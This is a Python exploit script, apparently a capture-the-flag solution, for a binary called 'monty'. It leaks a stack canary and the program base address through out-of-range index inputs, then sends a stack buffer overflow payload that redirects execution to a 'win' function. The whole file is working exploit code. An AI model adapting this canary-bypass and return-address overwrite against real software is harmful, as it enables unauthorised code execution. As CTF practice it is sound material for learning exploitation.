#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./monty")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    # canary leak
    io.sendlineafter(b"? ", b"55")
    io.recvuntil(b"1: ")
    canary = int(io.recvline().strip(b"\n"))
    ptr.logger.info(f"canary: {hex(canary)}")

    # exe leak
    io.sendlineafter(b"? ", b"57")
    io.recvuntil(b"2: ")
    exe.base = int(io.recvline().strip(b"\n")) - unwrap(exe.symbol("main")) - 48

    io.sendlineafter(b"! ", b"0")

    payload = b""
    payload += b"A" * 0x18
    payload += ptr.p64(canary)
    payload += b"A" * 8
    payload += ptr.p64(unwrap(exe.symbol("win")) + 1)
    io.sendlineafter(b": ", payload)

    io.interactive()
    return


if __name__ == "__main__":
    main()
